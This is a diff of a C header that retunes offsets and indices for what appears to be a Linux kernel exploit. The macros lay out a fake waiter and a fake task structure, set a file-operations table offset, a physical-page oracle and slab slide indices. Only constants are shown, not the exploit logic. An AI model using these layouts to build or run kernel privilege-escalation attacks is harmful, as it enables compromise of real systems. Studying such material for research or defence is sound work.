@@ -26,7 +26,7 @@
 #define APP_FOPS_DEFER_ALIAS_READBACK 1
 #define APP_FOPS_DURABLE_POSTWRITE_LOG 1
 #define APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE 1
-#define APP_FOPS_TABLE_MIRROR_OFF 0x0800
+#define APP_FOPS_TABLE_MIRROR_OFF 0x1e80
 #define APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION 1
 #define APP_PHYS_P0_ORACLE 1
 #else
@@ -71,7 +71,7 @@
 #define APP_DEFER_FINAL_DRAIN_REAP 1
 #define APP_DEFER_ALL_DRAIN_REAPS 1
 #define APP_QUIET_RECLAIM_WINDOW 1
-#define APP_SLIDE_MIN_OBJECT_INDEX 0
+#define APP_SLIDE_MIN_OBJECT_INDEX 2
 #define APP_SLIDE_MAX_OBJECT_INDEX 28
 #define APP_FOPS_MIN_OBJECT_INDEX 24
 #define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8080000000ULL
@@ -230,15 +230,10 @@
 #define FAKE_WAITER_DEADLINE_OFF      0x48
 #define FAKE_WAITER_WW_CTX_OFF        0x50
 
-#define FAKE_WAITER_TREE_PRIO_OFF       FAKE_WAITER_PRIO_OFF
-#define FAKE_WAITER_TREE_DEADLINE_OFF   FAKE_WAITER_DEADLINE_OFF
-#define FAKE_WAITER_PI_TREE_PRIO_OFF    FAKE_WAITER_PRIO_OFF
-#define FAKE_WAITER_PI_TREE_DEADLINE_OFF FAKE_WAITER_DEADLINE_OFF
-
 // ============================================================================
 // FAKE TASK LAYOUT
 // ============================================================================
-#define FAKE_TASK_OFF 0x00c0
+#define FAKE_TASK_OFF 0x3200
 #define FAKE_TASK_USAGE_OFF 0x40
 #define FAKE_TASK_PRIO_OFF 0x84
 #define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
@@ -251,12 +246,12 @@
 // ============================================================================
 // OUTRAS STRUCTS
 // ============================================================================
-#define LOCK_OFF 0x0000
-#define W0_OFF 0x0040
-#define FOPS_OFF 0x0a40
-#define SCRATCH_OFF 0x0c00
-#define RIGHT_OFF  0x0bc0
-#define LEFT_OFF  0x0b80
+#define LOCK_OFF 0x2210
+#define W0_OFF 0x2350
+#define FOPS_OFF 0x2000
+#define SCRATCH_OFF 0x3000
+#define RIGHT_OFF 0x4440
+#define LEFT_OFF 0x5550
 
 #define CFG_PAGE_OFF 16
 #define CFG_NEEDS_READ_FILL_OFF 80
